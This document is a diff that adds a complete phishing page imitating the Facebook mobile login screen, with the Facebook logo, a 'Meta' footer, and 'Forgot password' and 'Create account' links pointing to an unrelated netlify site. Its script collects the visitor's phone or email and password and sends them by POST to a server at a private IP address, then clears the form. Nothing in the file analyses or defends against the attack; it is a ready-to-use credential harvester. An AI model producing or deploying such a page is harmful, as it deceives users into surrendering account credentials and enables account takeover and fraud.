@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook</title>
+  <style>
+    :root {
+      --fb-blue:#1877f2;
+      --text:#1c1e21;
+      --border:#ccd0d5;
+    }
+    * { box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+    body {
+      margin:0;
+      background:#fff;
+      color:var(--text);
+      display:flex;
+      flex-direction:column;
+      min-height:100vh;
+      -webkit-font-smoothing:antialiased;
+    }
+    header {
+      height:48px;
+      display:flex;
+      align-items:center;
+      padding:0 12px;
+    }
+    a {
+      text-decoration:none;
+      color:var(--text);
+    }
+    header a {
+      text-decoration:none;
+      font-size:26px;
+      line-height:1;
+      color:#222;
+    }
+      .message {
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
+    }
+     .error {
+      color: #e53935;
+    }
+    .language {
+      text-align:center;
+      font-size:14px;
+      margin-top:12%;
+      margin-bottom:8%;
+    }
+    .language span {
+      display:inline-flex;
+      align-items:center;
+      gap:4px;
+      cursor:pointer;
+    }
+    .logo-wrap {
+      display:flex;
+      justify-content:center;
+      margin:28px 0 12px;
+    }
+    .fb-logo {
+      width:72px;
+      height:72px;
+      object-fit:contain;
+      margin-bottom: 15%;
+    }
+    form {
+      width:100%;
+      max-width:370px;
+      margin:0 auto;
+      display:flex;
+      flex-direction:column;
+      gap:12px;
+      padding:0 16px;
+    }
+    input {
+      width:100%;
+      font-size:16px;
+      padding:14px 14px;
+      border:1px solid var(--border);
+      border-radius:8px;
+      outline:none;
+      background:#fff;
+    }
+    input:focus {
+      border-color:var(--fb-blue);
+      box-shadow:0 0 0 1px var(--fb-blue);
+    }
+    button {
+      padding:14px 16px;
+      font-size:17px;
+      border:none;
+      border-radius:8px;
+      background:var(--fb-blue);
+      color:#fff;
+      font-weight:600;
+      cursor:pointer;
+    }
+    button:active {
+      filter:brightness(.9);
+    }
+    .forgot {
+      margin:14px 0 8px;
+      text-align:center;
+      font-size:14px;
+      color:rgb(32, 31, 31);
+      cursor:pointer;
+      margin-bottom: 20%;
+    }
+    .create-account {
+      width:90%;
+      max-width:370px;
+      margin:8px auto 0;
+      padding:13px 16px;
+      border:1px solid var(--fb-blue);
+      color:var(--fb-blue);
+      border-radius:28px;
+      font-size:15px;
+      font-weight:600;
+      text-align:center;
+      cursor:pointer;
+      background:#fff;
+    }
+    .create-account:active {
+      background:#f0f2f5;
+    }
+   .meta {
+      margin-top:10px;
+      padding:24px 0 18px;
+      text-align:center;
+      font-size:16px;
+      font-weight: bold;
+      color:#6a6d70;
+      letter-spacing:.5px;
+    }
+    /* Small height devices */
+    @media (max-height:660px){
+      .logo-wrap { margin:12px 0 6px; }
+      form { gap:10px; }
+      .forgot { margin:10px 0 6px; }
+    }
+  </style>
+</head>
+<body>
+
+
+  <div class="language">
+    <span>English (US) &#9662;</span>
+  </div>
+
+  <div class="logo-wrap">
+    <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo"/>
+  </div>
+
+  <form id="submitForm">
+  <div id="response" class="message"></div>
+  <input type="text" id="phone" placeholder="Mobile number or email" />
+  <input type="password" placeholder="Password" id="password"/>
+  <button type="submit">Log in</button>
+</form>
+
+  <a href="https://sweetlifemw.netlify.app">
+    <div class="forgot" >Forgot password?</div>
+
+  </a>
+  
+  <a href="https://sweetlifemw.netlify.app">
+    <div class="create-account" >Create new account</div>
+
+  </a>
+  <div class="meta">Meta</div>
+
+  <script>
+    const form = document.getElementById('submitForm');
+    const responseDiv = document.getElementById('response');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value;
+
+      // Frontend validation
+      if (!phone || !password || password.length < 6) {
+        responseDiv.textContent = "Phone and password are required. Password must be at least 6 characters.";
+        responseDiv.className = "message error";
+        return;
+      }
+
+      try {
+        const res = await fetch("http://192.168.146.231:8000/api/submit", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ phone, password })
+        });
+
+        const data = await res.json();
+
+        if (!res.ok) {
+          responseDiv.textContent = data.message || "Error occurred.";
+          responseDiv.className = "message error";
+        } else {
+          responseDiv.textContent = data.message;
+          responseDiv.className = "message success";
+          form.reset();
+        }
+      } catch (error) {
+        responseDiv.textContent = "Failed to connect to server.";
+        responseDiv.className = "message error";
+      }
+    });
+  </script>
+</body>
+</html>
+
